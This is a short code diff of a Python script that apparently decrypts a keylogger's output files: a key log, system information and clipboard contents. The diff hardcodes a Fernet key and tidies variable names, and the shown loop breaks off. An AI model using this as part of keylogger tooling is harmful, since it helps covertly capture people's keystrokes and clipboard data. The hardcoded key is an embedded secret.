@@ -1,14 +1,14 @@
 from cryptography.fernet import Fernet
 
-key = ""
+key = "ZKG-hah0-GiBfJOqhwbzobPEvh9z1xhFOPYIimr5Id4="
 
 e_keys = "e_key_log.txt"
 e_sys_info = "e_sysInfo.txt"
 e_clipboard_info = "e_clipboard.txt"
 
-encrypted_files = [e_key_log.txt, e_sysInfo.txt, e_clipboard.txt]
+encrypted_files = [e_keys, e_sys_info, e_clipboard_info]
 
-count = 0
+file_count = 0
 
 for file in encrypted_files:
 
